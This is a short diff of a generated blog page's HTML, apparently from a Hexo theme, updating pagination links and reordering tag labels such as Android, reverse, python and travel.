-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
     </nav>
   
 
@@ -1351,7 +1418,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+                <a href="javascript:void(0)" class="js-tag color3">Android</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1359,7 +1426,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Android</a>
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1375,11 +1442,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">travel</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
+                <a href="javascript:void(0)" class="js-tag color2">travel</a>
               </li>
             
             <div class="clearfix"></div>
